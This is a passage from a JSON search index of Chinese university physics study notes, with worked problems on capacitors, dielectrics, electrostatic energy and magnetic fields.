\\(U_r=\\frac{1}{4\\pi\\varepsilon_0}(\\frac{q}{r}-\\frac{q}{R_1}+\\frac{q+Q}{R_2})\\)</p> <p>\u5bf9\u4e8e\u7403\u58f3\uff0c\u540c\u6837\u5c06\u7535\u52bf\u53e0\u52a0\u5373\u53ef\uff1a\\(U_{R_1}=\\frac{1}{4\\pi\\varepsilon_0}(\\frac{q}{R_1}-\\frac{q}{R_1}+\\frac{q+Q}{R_2})=\\frac{1}{4\\pi\\varepsilon_0}\\frac{q+Q}{R_2} = U_{R_{2}}\\)</p> <p>(2) \u6545\u7535\u52bf\u5dee\u4e3a\uff1a\\(U_r-U_{R_1}=\\boxed{\\frac1{4\\pi\\varepsilon_0}\\left( \\frac qr-\\frac q{R_1} \\right)}\\) \u3002</p> <p>Tip</p> <p>\u53ef\u4ee5\u53d1\u73b0\u7535\u52bf\u5dee\u4e0e Q \u65e0\u5173\u3002</p> <p>(3) \u7535\u52bf\u5dee\u4e0e Q \u65e0\u5173\uff0c\u6240\u4ee5\u4ecd\u7136\u4e3a \\(\\frac1{4\\pi\\varepsilon_0}(\\frac qr-\\frac q{R_1})\\) \uff1b\u6309\u7167\u4e4b\u524d\u7684\u65b9\u6cd5\u91cd\u590d\u8ba1\u7b97\uff0c\u4f1a\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c\u3002</p> <p>(4) \u5bb9\u5668\u4e24\u90e8\u5206\u7684\u5e26\u7535\u91cf\u4e0d\u540c\uff0c\u600e\u4e48\u529e\uff1f\u7535\u5bb9\u662f\u7535\u5bb9\u5668\u7684\u56fa\u6709\u5c5e\u6027\uff0c\u4e0d\u4f1a\u968f\u5e26\u7535\u91cf\u53d1\u751f\u53d8\u5316\u3002\u6211\u4eec\u53d1\u73b0\u7535\u52bf\u5dee\u4e0e Q \u65e0\u5173\uff0c\u4e0d\u59a8\u4ee4 Q = -q\uff0c\u5219\u6709\uff1a\\(C=\\frac{q}{\\Delta U}=\\boxed{\\frac{4\\pi \\varepsilon}{\\left( \\frac{1}{r} -\\frac{1}{R_{1}}\\right)}}\\)</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#i2","title":"I.2 \u7535\u5bb9\u5668\u6c42\u89e3","text":"<p>\u7535\u5bb9\u6c42\u89e3\u516c\u5f0f</p> <p></p> <p>Question</p> <p>\u4e24\u540c\u5fc3\u91d1\u5c5e\u7403\u58f3\uff0c\u5185\u7403\u58f3\u5e26\u7535 q,\u5916\u7403\u58f3\u5e26\u7535 Q,\u4e24\u4e2a\u7403\u58f3\u7684\u7535\u52bf\u5dee\u4e3a V,\u95ee\u7cfb\u7edf\u7535\u5bb9\u662f\u591a\u5c11\uff1f</p> <p>\u6211\u4eec\u77e5\u9053\uff0cQ \u5bf9\u4e8e\u4e24\u7403\u58f3\u4e4b\u95f4\u7684\u7535\u52bf\u5dee\u5e76\u6ca1\u6709\u8d21\u732e\uff0c\u4e5f\u5c31\u8bf4\u4ee4 Q = q \uff0c\u7535\u52bf\u5dee\u4f9d\u65e7\u4e3a V\uff0c\u90a3\u4e48 \\(C=\\frac{q}{V}\\) \u3002</p> <p>Question</p> <p>\u8bbe\u6709\u534a\u5f84\u90fd\u662f r \u7684\u4e24\u6761\u5e73\u884c\u201c\u65e0\u9650\u957f\u201d\u8f93\u7535\u7ebf A \u548c B\uff0c\u4e24\u8f74\u95f4\u76f8\u8ddd\u4e3a d \uff0c\u4e14\u6ee1\u8db3 d&gt;&gt;r \uff0c\u6c42\u4e24\u8f93\u7535\u7ebf\u5355\u4f4d\u957f\u5ea6\u7684\u7535\u5bb9\u3002</p> <p></p> <p></p> <p>\u7531 B \u81f3\u63a5\u5730\uff0c\u53ef\u4ee5\u5c06\u5176\u770b\u4f5c\u4e24\u4e2a\u7535\u5bb9\u5668\u5e76\u8054\uff1a</p> \\[ \\begin{aligned}&amp;U_{BA}=U_{BC}\\to E_{BA}=2E_{BC}\\to q_{B\\text{\u4e0a}}=2q_{B\\text{\u4e0b}}=\\frac{2q}{3}\\\\&amp;q_{A\\text{\u4e0b}}=-q_{B\\text{\u4e0a}}=-\\frac{2q}{3},\\:q_{C\\text{\u4e0a}}=-q_{B\\text{\u4e0b}}=-\\frac{q}{3}\\\\ &amp; C_{BA}=\\varepsilon_0S/d,\\:C_{BC}=\\varepsilon_0S/2d,\\to C=C_{BA}+C_{BC}=3\\varepsilon_0S/2d\\end{aligned} \\] <p>Question</p> <p></p> <p>\u7406\u6e05\uff1a\u6309\u4e0b\u540e\uff0c\u7535\u5bb9\u5e94\u8be5\u662f\u53d8\u5927\u8fd8\u662f\u53d8\u5c0f\uff1f</p> <p>\\(\\Delta C=C-C_0=\\frac{\\varepsilon_0S}{d-\\Delta d}-\\frac{\\varepsilon_0S}{d} \\implies \\Delta d=\\boxed{\\frac{d}{1+[\\varepsilon_0S/(d\\Delta C)]}=0.152\\times10^{-3}\\:\\mathrm{m}}\\)</p> <p>Question</p> <p>\u4e00\u5e73\u884c\u677f\u7535\u5bb9\u5668\u4e2d\u5145\u6ee1\u76f8\u5bf9\u4ecb\u7535\u5e38\u6570\u4e3a \\(\\varepsilon_{r}\\) \u7684\u5404\u5411\u540c\u6027\u5747\u5300\u7535\u4ecb\u8d28.\u5df2\u77e5\u4ecb\u8d28\u4e24\u8868\u9762\u6781\u5316\u7535\u8377\u9762\u5bc6\u5ea6\u4e3a \\(\\pm\\sigma'\\) \uff0c\u5219\u6781\u5316\u7535\u8377\u5728\u7535\u5bb9\u5668\u5185\u4ea7\u751f\u7684\u7535\u573a\u5f3a\u5ea6\u4e3a\uff1f</p> <p>\u6cd5\u4e00\uff1a\u5229\u7528 \\(E=E_{0}+E'\\) \uff0c\u5373\u6211\u4eec\u8981\u6c42\u7684\u5c31\u662f E' \u3002</p> <p>\u6cd5\u4e8c\uff1a\u6781\u5316\u7535\u8377\u540c\u6837\u7b26\u5408\u9ad8\u65af\u5b9a\u7406<sup>1</sup>\uff0c\\(\\oint_s\\mathbf{E'}d\\mathbf{S}=\\frac{\\sum q'}{\\varepsilon_{0}}\\implies E' = \\frac{\\sigma'}{\\varepsilon_{0}}\\)</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#i3","title":"I.3 \u7535\u4ecb\u8d28\u4e0b\u9759\u7535\u573a\u95ee\u9898\u6c42\u89e3","text":"<p>Question</p> <p></p> <p>\u7535\u538b\u4e0d\u53d8\uff0c\\(E=\\frac{U}{d}=E_{0}\\) \uff1b\\(D=\\varepsilon E = \\varepsilon_{r}D_{0}\\) \u3002</p> <p>Question</p> <p>\u5e73\u884c\u677f\u7535\u5bb9\u5668\u4e24\u6781\u677f\u9762\u79ef\u4e3a S \uff0c\u95f4\u8ddd\u4e3ad \u3002\u5728\u6781\u677f\u95f4\u5e73\u884c\u5730\u653e\u7f6e\u4e24\u5757\u539a\u5ea6\u5206\u522b\u4e3a \\(d_{1}\\) \u548c \\(d_{2}\\) \u7684\u4ecb\u8d28\u677f\uff0c\u5176\u76f8\u5bf9\u4ecb\u7535\u5e38\u6570\u5206\u522b\u4e3a \\(\u03b5_{r_{1}}\\) \u548c \\(\u03b5_{r_{2}}\\) \u3002\u8bbe\u7535\u5bb9\u5668\u5145\u7535\u540e\u4e24\u6781\u677f\u5206\u522b\u5e26\u6709 \u00b1q \u7684\u7535\u8377\u3002\u8bd5\u6c42\uff1a\uff081\uff09\u7535\u5bb9\u5668\u7684\u7535\u5bb9\uff1b\uff082\uff09\u4e24\u4ecb\u8d28\u4ea4\u754c\u9762\u4e0a\u7684\u6781\u5316\u7535\u8377\u9762\u5bc6\u5ea6\u3002</p> <p></p> <p>(2) \u4e24\u4ecb\u8d28\u5728\u4ea4\u754c\u9762\u4e0a\u7684\u6781\u5316\u7535\u8377\u9762\u5bc6\u5ea6\u7684\u603b\u91cf\u7b49\u4e8e\u4e24\u4ecb\u8d28\u754c\u9762\u4e0a\u7684\u6781\u5316\u7535\u8377\u9762\u5bc6\u5ea6\u7684\u4ee3\u6570\u548c\uff1b\u7531 \\(\\mathbf{P}=\\varepsilon_{_0}(\\varepsilon_{_r}-1)\\mathbf{E}\\) \uff1b \\(\\sigma^{\\prime}=P\\cdot n\\) \u5f97\u5230\uff1a</p> <p>\\(\\sigma_1'+\\sigma_2'=\\mathbf{P_1}\\cdot\\mathbf{n}_1+\\mathbf{P}_2\\cdot\\mathbf{n}_2=P_1-P_2=\\mathbf{\\varepsilon}_0(\\mathbf{\\varepsilon}_{r1}-1)E_1-\\mathbf{\\varepsilon}_0(\\mathbf{\\varepsilon}_{r2}-1)E_2=\\boxed{\\left( \\frac{\\mathbf{\\varepsilon}_{r1}-\\mathbf{\\varepsilon}_{r2}}{\\mathbf{\\varepsilon}_{r1}\\mathbf{\\varepsilon}_{r2}} \\right)\\frac{q}{\\mathbf{S}}}\\)</p> <p>Question</p> <p>\u4e00\u7a7a\u6c14\u5e73\u884c\u677f\u7535\u5bb9\u5668\uff0c\u4e24\u677f\u95f4\u8ddd\u4e3a d \uff0c\u6781\u677f\u4e0a\u5e26\u7535\u91cf\u5206\u522b\u4e3a +q \u548c -q \uff0c\u677f\u95f4\u7535\u52bf\u4e3a U \uff0c\u5ffd\u7565\u8fb9\u7f18\u6548\u5e94\uff1b\u5c06\u7535\u6e90\u65ad\u5f00\uff0c\u5728\u4e24\u677f\u95f4\u5e73\u884c\u63d2\u5165\u4e00\u539a\u5ea6\u4e3a t \uff08 t &lt; d \uff09\u7684\u91d1\u5c5e\u677f\uff0c\u5219\u677f\u95f4\u7535\u52bf\u5dee\u548c\u6b64\u65f6\u7535\u5bb9\u4e3a\uff1f</p> Tip <p>\u63d2\u5165\u91d1\u5c5e\u677f\u76f8\u5f53\u4e8e\u53d8\u6210\u4e86\u4e24\u4e2a\u7535\u5bb9\u5668\u4e32\u8054\uff0c\u8fdb\u4e00\u6b65\u53ef\u4ee5\u770b\u6210\u662f\u4e24\u677f\u8ddd\u79bb\u7f29\u5c0f\u3002</p> <p>\u90a3\u4e48\u5c31\u7b80\u5355\u4e86\uff1a</p> <p>\\(U'=E(d-t)=\\boxed{\\frac{d-t}dU}\\) \uff0c\\(C'=\\frac{q}{U'}=\\boxed{\\frac{q}{U}\\frac{d}{d-t}}\\)</p> <p>Question</p> <p>\u4e00\u7403\u5f62\u7535\u5bb9\u5668\uff0c\u5185\u5916\u7403\u9762\u534a\u5f84\u5206\u522b\u4e3a \\(R_{1}\\) = 2cm \u548c \\(R_{2}\\) = 4cm \uff0c\u5728\u4e24\u7403\u95f4\u5145\u6ee1\u51fb\u7a7f\u7535\u573a\u5f3a\u5ea6\u4e3a 160kV/m \u7684\u7535\u4ecb\u8d28\uff1b\u5219\u8be5\u7535\u5bb9\u5668\u80fd\u627f\u53d7\u7684\u6700\u5927\u7535\u538b\u4e3a</p> Tip <p>\u4e24\u534a\u5f84\u5206\u522b\u4e3a \\(R_1 &lt; R_2\\) \u540c\u5fc3\u7403\u58f3\uff0c\u5e26\u7535\u91cf\u4e3a \u00b1q \u65f6\uff0c\u4e24\u7403\u58f3\u4e4b\u95f4\u7684\u7535\u573a\u5f3a\u5ea6\u4e3a \\(E= \\frac{q}{4\\pi \\varepsilon_{0}r^2}\\) \uff0c\\(U=\\frac{q}{4\\pi \\varepsilon_{0}r^2}\\left( \\frac{1}{R_{1}}-\\frac{1}{R_{2}} \\right)\\)\uff1b\u6b64\u65f6\u5f62\u6210\u7684\u7535\u5bb9\u4e3a \\(C=4\\pi\\varepsilon_0\\frac{R_2R_1}{R_2-R_1}\\) \u3002</p> <p>\u573a\u5f3a\u6700\u5927\u5904\u663e\u7136\u4e3a r=R1 \u5904\uff0c\u6545\u6709 </p> <p>\\(E_{\u51fb\u7a7f}=\\frac{q}{4\\pi \\varepsilon_{0}R_{1}^2}\\) =&gt; \\(U_{\u51fb\u7a7f}=R_1^2E_\\text{\u51fb\u7a7f}\\left(\\frac1{R_1}-\\frac1{R_2}\\right)=\\boxed{1.6\\times10^3 V}\\)</p> <p>Question</p> <p>\u4e00\u4e2a\u534a\u5f84\u4e3a R \u7684\u7535\u4ecb\u8d28\u7403\u88ab\u5747\u5300\u6781\u5316\u540e\uff0c\u5df2\u77e5\u7535\u6781\u5316\u5f3a\u5ea6\u4e3a P\u3002</p> <p>\u6c42\uff1a(1)\u7535\u4ecb\u8d28\u7403\u8868\u9762\u4e0a\u6781\u5316\u9762\u7535\u8377\u7684\u5206\u5e03\uff1b (2)\u6781\u5316\u9762\u7535\u8377\u5728\u7535\u4ecb\u8d28\u7403\u5fc3\u5904\u6240\u6fc0\u53d1\u7684\u573a\u5f3a\uff1f</p> Tip <p></p> <p>\u5bf9\u4e8e\u8003\u8bd5\u800c\u8a00\uff0c\u628a\u201c\u6781\u5316\u201d\u5f53\u4f5c\u4e00\u4e2a\u201c\u573a\u201d\uff0c\u5e76\u8bb0\u4f4f\u6781\u5316\u5f3a\u5ea6\u662f\u5982\u4f55\u5f71\u54cd\u7535\u8377\u9762\u5bc6\u5ea6\u7684\uff0c\u90a3\u4e48 \\(\\sigma\\) \u7684\u5206\u5e03\u5f88\u597d\u7406\u89e3\u4e86\uff1b\u5bf9\u4e8e\u5bf9\u5e94\u573a\u5f3a\u7684\u6c42\u89e3\uff08dE' \u4e3a\u6c34\u5e73\u65b9\u5411\u5206\u91cf\uff09\uff1a</p> <p></p> <p>Question</p> <p></p> <p>\u6ce8\u610f\u770b A \u9009\u9879\uff0c\u5355\u72ec\u5728 A \u5904\u653e\u4e0a\u7535\u4ecb\u8d28\uff0c\u6b64\u65f6\u7535\u573a\u4e0d\u518d\u5bf9\u79f0\uff0c\u4e0d\u80fd\u591f\u4f7f\u7528\u9ad8\u65af\u5b9a\u7406\u3002</p> <p>\u7b54\u6848\uff1aC</p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#i4","title":"I.4 \u6c42\u9759\u7535\u573a\u4e2d\u7684\u80fd\u91cf","text":"<p>Question</p> <p>\u5e73\u884c\u677f\u7535\u5bb9\u5668\u6781\u677f\u9762\u79ef\u4e3a \\(2\u00d710^{-2} m^2\\)\uff0c\u6781\u677f\u95f4\u8ddd\u79bb\u4e3a \\(1\u00d710^{\u22123} m\\)\uff0c\u5728\u7535\u5bb9\u5668\u5185\u6709\u4e00\u4ecb\u8d28\u677f\uff08 \\(\u03b5_r = 5\\) \uff09 \u5145\u6ee1\u4e24\u6781\u677f\u95f4\u7684\u5168\u90e8\u7a7a\u95f4\u3002\u7535\u5bb9\u5668\u4e0e 300V \u7535\u6e90\u76f8\u8fde\uff0c\u5145\u7535\u540e\u5c06\u7535\u6e90\u5207\u65ad\uff0c\u518d\u62bd\u51fa\u4ecb\u8d28\u677f\u3002</p> <p>\u6c42\uff1a(1) \u62bd\u51fa\u8fc7\u7a0b\u4e2d\u5916\u529b\u6240\u505a\u7684\u529f\uff1b\uff082\uff09\u62bd\u51fa\u4ecb\u8d28\u677f\u540e\uff0c\u4e24\u6781\u677f\u95f4\u76f8\u4e92\u4f5c\u7528\u529b\u3002</p> <p>(1)</p> \\[ \\begin{cases} C_{1} = \\frac{\\varepsilon \\varepsilon_{r}S}{d} \\\\ Q = C_{1}U \\\\ W_{1}=\\frac{Q^2}{2C_{1}} \\\\ W_{2}=\\frac{Q^2}{2C_{2}} \\\\ \\Delta W = W_{2}-W_{1} \\end{cases} \\implies \\Delta W = \\frac{1}{2}\\frac{\\varepsilon_0\\varepsilon_rS}{d}U^2(\\varepsilon_r-1)=\\boxed{1.59\\times10^{-4}J} \\] <p>\u4e60\u60ef\u4e0a\uff0c\u6211\u4eec\u7528 \\(\\Delta W\\) \u8868\u793a\u80fd\u91cf\u53d8\u5316\uff0c\u7528 A \u8868\u793a\u7535\u573a\u529b\u505a\u529f\u3002</p> <p>(2)</p> <p>\u4e0b\u9762\u7684 x \u8868\u793a\u6781\u677f\u95f4\u7684\u8ddd\u79bb\u3002</p> <p>\\(F = \\frac{dA}{dx}\\) &amp; \\(A = -\\Delta W\\) &amp; \\(W=\\frac12\\frac{Q^2x}{\\varepsilon_0S}\\) =&gt; F = -0.199N</p> <p>Question</p> <p>\u5e73\u884c\u677f\u7535\u5bb9\u5668\u7684\u6781\u677f\u662f\u8fb9\u957f\u4e3a a \u7684\u6b63\u65b9\u5f62\uff0c\u95f4\u8ddd\u4e3a d\uff0c\u4e24\u677f\u5e26\u7535\u00b1Q\u3002\u5982\u56fe\u6240\u793a\uff0c\u628a\u539a\u5ea6\u4e3a d\u3001\u76f8\u5bf9\u4ecb\u7535\u5e38\u91cf\u4e3a\u03b5r \u7684\u7535\u4ecb\u8d28\u677f\u63d2\u5165\u4e00\u534a\u3002\u8bd5\u6c42\u7535\u4ecb\u8d28\u677f\u6240\u53d7\u7535\u573a\u529b\u7684\u5927\u5c0f\u53ca\u65b9\u5411\u3002</p> <p><p></p></p> <p>\u7535\u89e3\u8d28\u53d7\u529b\u600e\u4e48\u6c42\uff1f\u540c\u4e0a\u4e00\u9898\uff0c\u52bf\u80fd\u6c42\u5bfc\u3002</p> \\[ C(x)=\\frac{\\varepsilon_0\\varepsilon_rxa}d+\\frac{\\varepsilon_0(a-x)a}d=\\frac{\\varepsilon_0a}d[a+(\\varepsilon_r-1)x] \\] <p>\u6b64\u65f6\uff0c\u7535\u5bb9\u5668\u7684\u9759\u7535\u80fd\u4e3a: \\(W(x)=\\frac{Q^2}{2C}=\\frac{Q^2d}{2\\varepsilon_0a[a+(\\varepsilon_r-1)x]}\\)</p> \\[ F=-\\frac{dW(x)}{dx}=\\frac{(\\varepsilon_r-1)Q^2d}{2\\varepsilon_0a[a+(\\varepsilon_r-1)x]^2} \\] <p>\u4ee3\u5165 x=a/2 \u5f97\uff1a\\(F(\\frac a2)=\\frac{2(\\varepsilon_r-1)Q^2d}{\\varepsilon_0a^3(\\varepsilon_r+1)^2}\\)</p> <p>Note</p> <p>\u5b9a\u4e49\u5355\u4f4d\u4f53\u79ef\u4e0a\u7684\u7535\u573a\u80fd\u91cf\u4e3a\u7535\u80fd\u5bc6\u5ea6 \\(\\omega_e=\\frac12\\varepsilon E^2=\\frac12DE\\)</p> <p>\u6c42\u89e3\u4efb\u610f\u5e26\u7535\u4f53\u7684\u9759\u7535\u80fd\uff1a \\(W=\\frac12\\iiint_V\\rho UdV=\\iiint_Vw_{e}dV\\) </p> <p>Question</p> <p>\u8ba1\u7b97\u5747\u5300\u5e26\u7535\u7403\u4f53\u7684\u9759\u7535\u80fd\uff0c\u8bbe\u7403\u7684\u534a\u5f84\u4e3a R\uff0c\u6240\u5e26\u7535\u91cf\u4e3a q\uff0c\u7403\u5916\u4e3a\u771f\u7a7a\u3002</p> <p>\u5df2\u77e5\u7535\u8377\u4f53\u5bc6\u5ea6\u4e3a \\(\\rho=\\frac q{\\frac43\\pi R^3}\\) \u5219\u5747\u5300\u5e26\u7535\u7403\u4f53\u6240\u6fc0\u53d1\u7684\u7535\u573a\u5206\u5e03\u4e3a:</p> \\[\\vec{E}=\\begin{cases}\\frac{1}{4\\pi\\varepsilon_0}\\frac{q}{R^3}\\frac{r}{r}&amp;(r&lt;R)\\\\\\frac{1}{4\\pi\\varepsilon_0}\\frac{q}{r^3}\\frac{r}{r}&amp;(r&gt;R)&amp;\\end{cases}\\] \\[W=\\frac12\\iiint_V\\rho UdV=\\frac12\\frac q{\\frac43\\pi R^3}\\int_0^R(\\frac{3q}{8\\pi\\varepsilon_0R}-\\frac{qr^2}{8\\pi\\varepsilon_0R^3})4\\pi r^2dr\\\\=\\frac3{20}\\frac{q^2}{\\pi\\varepsilon_0R}\\] <p>\u7528 \\(W=\\frac{\\mathcal{E}_0}2\\iiint_VE^2dV\\) \u8ba1\u7b97\uff0c\u5f97\uff1a</p> \\[ \\begin{aligned}W&amp;=\\frac{\\varepsilon_0}2\\iiint_VE^2dV\\\\&amp;=\\frac{\\varepsilon_0}2\\int_0^R\\left( \\frac1{4\\pi\\varepsilon_0}\\frac{qr}{R^3} \\right)^24\\pi r^2dr+\\frac{\\varepsilon_0}2\\int_R^\\infty\\left( \\frac1{4\\pi\\varepsilon_0}\\frac q{r^2} \\right)^24\\pi r^2dr\\\\&amp;=\\frac{q^2}{40\\pi\\varepsilon_0R}+\\frac{q^2}{8\\pi\\varepsilon_0R}=\\boxed{\\frac3{20}\\frac{q^2}{\\pi\\varepsilon_0R}}\\end{aligned} \\] <p></p> <p>\u4e0a\u56fe\u4e2d\uff0cA \u662f\u6307\u5c06\u5bf9\u5e94\u7535\u8377\u4ece\u65e0\u7a77\u8fdc\u5904\u52a0\u5165\u5230\u8be5\u7cfb\u7edf\u9700\u8981\u505a\u7684\u529f\uff0c\u4e5f\u5373\u589e\u52a0\u7684\u7535\u52bf\u80fd\u3002</p> <p>=&gt; \u5b64\u7acb\u5bfc\u4f53\u6240\u5e26\u9759\u7535\u80fd\uff1a\\(W= \\frac{1}{2}QU\\) \uff08\u5229\u7528\u5176\u7b49\u52bf\u4f53\u7684\u6027\u8d28\uff09 </p> <p>Note</p> <p>\u7535\u5bb9\u5668\u80fd\u91cf\u4e3a \\(W=\\frac{Q^2}{2C}=\\frac{QU}{2}=\\frac{CU^2}{2}\\)</p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii-15","title":"II \u7b2c 15 \u7ae0\uff1a\u7535\u6d41\u548c\u78c1\u573a","text":"","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii1","title":"II.1 \u6c42\u78c1\u611f\u5e94\u5f3a\u5ea6","text":"<p>Note</p> <ol> <li>\u4f9d\u7167\u5b9a\u4e49\u6709\uff1a\\(F=q\\mathbf{v}\\times\\mathbf{B}\\)</li> </ol> <ul> <li>\u82e5\u662f\u76f4\u7ebf\u7535\u6d41\u4ea7\u751f\u7684\u78c1\u573a\uff0c\u5927\u62c7\u6307\u6307\u5411\u7535\u6d41\u65b9\u5411\uff0c\u5219\u5176\u5b83\u56db\u6307\u7684\u7ed5\u884c\u65b9\u5411\u5c31\u662f B \u7684\u65b9\u5411\uff1b</li> <li>\u82e5\u662f\u73af\u5f62\u7535\u6d41\u4ea7\u751f\u7684\u78c1\u573a\uff0c\u5176\u5b83\u56db\u6307\u7684\u7ed5\u884c\u65b9\u5411\u4e3a\u7535\u6d41\u65b9\u5411\uff0c\u5219\u5927\u62c7\u6307\u6307\u5411 B \u7684\u65b9\u5411\u3002</li> </ul> <ol> <li>\u7528\u6bd5\u5965-\u8428\u4f10\u5c14\u5b9a\u5f8b\u6c42\u78c1\u611f\u5e94\u5f3a\u5ea6\u3002</li> </ol> <p></p> <ol> <li>\u7528\u5b89\u57f9\u73af\u8def\u5b9a\u7406\u6c42\u78c1\u611f\u5e94\u5f3a\u5ea6\u3002</li> </ol> <p></p> <p>Tip</p> <p></p> <p></p> <p>\u6ce8\u610f\u7b2c\u56db\u4e2a\u516c\u5f0f\u7684 j \u610f\u4e49\u5e94\u5f53\u4e3a\u5355\u4f4d\u5bbd\u5ea6\uff08\u56e0\u4e3a\u6211\u4eec\u5ffd\u7565\u4e86\u65e0\u9650\u5927\u5e73\u9762\u7684\u539a\u5ea6\uff09\u4e0b\u7684\u7535\u6d41\u5f3a\u5ea6\uff0c\u5373 \\(\\frac{I}{d}\\)\uff1b\u5982\u679c\u6309\u7167\u4e4b\u524d \\(\\frac{I}{S}\\) \u4f1a\u53d1\u73b0\u91cf\u7eb2\u6709\u8bef\u3002</p> <p>Question</p> <p><p></p></p> <p>\u6ce8\u610f\u770b\u6e05\u695a\u8fdb\u51fa\u7684\u7535\u6d41\uff0c\u7b54\u6848\u4e3a \\(\\mu_0(I_2-2I_1)\\) \u3002</p> <p>Question</p> <p></p> <p>\u5206\u6bb5\u6c42\u89e3\uff0c\u6ce8\u610f\u5224\u522b\u65b9\u5411\uff0c </p> <p>\\(B=B_{3}+B_2-B_1=0+\\frac{3\\mu_0I}{8R}-\\frac{\\mu_0I}{4\\pi R}=\\frac{\\mu_0I}{4R}(\\frac32-\\frac1\\pi)\\) \u65b9\u5411\u5782\u76f4\u7eb8\u9762\u5411\u91cc\u3002</p> <p>Question</p> <p>\u5728\u534a\u5f84\u4e3aR \u7684\u65e0\u9650\u957f\u534a\u5706\u7b52\u5f62\u91d1\u5c5e\u8584\u58c1\u4e2d\uff0c\u81ea\u4e0a\u800c\u4e0b\u901a\u8fc7\u7535\u6d41 I \uff0c\u8bbe\u7535\u6d41\u5747 \u5300\u5730\u5206\u5e03\u5728\u8584\u58c1\u4e0a\uff0c\u6c42\u8f74\u7ebf\u4e0a P \u70b9\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6\u3002</p> <p>\u5fae\u5206 =&gt; \u5957\u7528\u7ed3\u8bba =&gt; \u79ef\u5206</p> <p></p> <p>\u6839\u636e\u79ef\u5206\u533a\u95f4\u53ca\u5bf9\u79f0\u6027, \\(B_y=0\\text{,}B_x=\\int_0^\\pi\\frac{\\mu_0\\mathrm{I}}{2\\pi^2\\mathrm{R}}\\mathrm{sin}\\theta\\mathrm{d}\\theta=\\frac{\\mu_0\\mathrm{I}}{\\pi^2\\mathrm{R}}\\) \uff0c\u56e0\u6b64, \\(B=\\boxed{\\frac{\\mu_0\\mathrm{I}}{\\pi^2\\mathrm{R}}}\\) \u3002</p> <p>Question</p> <p>\u4e00\u534a\u5f84\u4e3a R \u7684\u65e0\u9650\u957f\u5706\u67f1\u5f62\u5bfc\u4f53\uff0c\u5728\u5176\u4e2d\u8ddd\u5176\u8f74\u7ebf\u4e3a d \u5904\u6316\u53bb\u4e00\u534a\u5f84\u4e3a r (2r\uff1cR\uff09\u3001\u8f74\u7ebf\u4e0e\u5927\u5706\u67f1\u5f62\u5bfc\u4f53\u5e73\u884c\u7684\u5c0f\u5706\u67f1\uff0c\u5f62\u6210\u5706\u67f1\u5f62\u7a7a\u8154\uff0c\u5bfc\u4f53\u4e2d\u6cbf\u8f74\u5747\u5300\u901a\u6709\u7535\u6d41 I\uff0c\u5982\u56fe\u6240\u793a\u3002\u8bd5\u6c42\u7a7a\u8154\u5185\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6 B\u3002</p> <p>\u7531\u4e8e\u6316\u7a7a\uff0c\u4e0d\u6ee1\u8db3\u5bf9\u79f0\u6027\uff0c\u4e0d\u65b9\u4fbf\u4f7f\u7528\u5b89\u57f9\u73af\u8def\u5b9a\u7406\u3002</p> <p>\u5bf9\u4e8e\u6316\u7a7a\u7684\u90e8\u5206\uff0c\u7535\u6d41\u4e3a 0\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u7a7a\u8154\u5185\u540c\u65f6\u5b58\u5728\u7b49\u5927\u53cd\u5411\u7684\u7535\u6d41\uff08\u8fd9\u548c\u9ad8\u4e2d\u6c42\u4e07\u6709\u5f15\u529b\u7684\u8865\u5168\u662f\u4e00\u81f4\u7684\uff0c\u8bbe\u7535\u6d41\u5bc6\u5ea6\u4e3a j \uff09\u3002</p> <p></p> <p>\u5219\u7531\u73af\u8def\u5b9a\u7406\u5f97 \\(B_{1}=\\frac{\\mu_0jr_1}{2},B_{2}=\\frac{\\mu_0jr_2}{2}\\)\uff0c\u6cbf\u5750\u6807\u8f74\u5206\u89e3\u5f97\uff1a</p> \\[ \\begin{cases} B_{1x}=-B_1\\sin\\theta=-\\frac{\\mu_0}2jr_1\\sin\\theta\\\\  B_{2x}=B_2\\sin\\alpha=\\frac{\\mu_0}2jr_2\\sin\\alpha\\\\ B_{1y}=B_1\\cos\\theta=\\frac{\\mu_0}2jr_1\\cos\\theta\\\\  B_{2y}=B_2\\cos\\alpha=\\frac{\\mu_0}2jr_2\\cos\\alpha  \\end{cases} \\] <p>\ud835\udc43\u70b9\u7684\u78c1\u611f\u5e94\u5f3a\u5ea6\ud835\udc69\u7684\u4e24\u4e2a\u6b63\u4ea4\u5206\u91cf\u4e3a\uff1a\uff08\u6700\u7ec8\u6cbf Y \u8f74\u6b63\u65b9\u5411\uff09</p> \\[ \\begin{cases}B_{x}=B_{1x}+B_{2x}=\\frac{\\mu_0j}2(r_2\\sin\\alpha-r_1\\sin\\theta)=0\\\\ B_{y}=B_{1y}+B_{2y}=\\frac{\\mu_0j}2(r_2\\cos\\alpha+r_1\\cos\\theta)=\\frac{\\mu_0j}2d\\end{cases} \\implies B=\\boxed{\\frac{\\mu_0Id}{2\\pi(R^2-r^2)}} \\] <p>Question</p> <p></p> <p></p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii2","title":"II.2 \u6c42\u78c1\u901a\u91cf","text":"<p>Tip</p> <p>\u8bb0\u5f97\u4f7f\u7528\u78c1\u573a\u4e2d\u7684\u9ad8\u65af\u5b9a\u7406 \\(\\Phi_\\mathrm{m}=\\oint_s\\mathbf{B}\\cdot\\mathrm{d}\\mathbf{S}=0\\) \u6765\u7b80\u5316\u95ee\u9898\u3002</p> <p>Question</p> <p></p> <p>\\(\\int_{S}\\mathbf{B}\\cdot\\mathrm{d}\\mathbf{S}=-\\int_{S^{\\prime}}\\mathbf{B}\\cdot\\mathrm{d}\\mathbf{S}=\\boxed{-\\pi r^{2}B\\cos\\alpha}\\)</p> <p>Question</p> <p></p> <p></p>","tags":["notes","physics"]},{"location":"note/physics/physics2-problems/#ii3","title":"II.3 \u6c42\u78c1\u529b","text":"<p>Question</p> <p>\u4e00\u6839\u5f2f\u66f2\u5bfc\u7ebf\u901a\u6709\u7535\u6d41 I\uff0c\u5f2f\u66f2\u90e8\u5206\u662f\u534a\u5f84\u4e3a R \u7684\u534a\u5706\uff0c\u4e24\u7aef\u76f4\u7ebf\u90e8\u5206\u7684\u957f\u5ea6\u5747\u4e3a 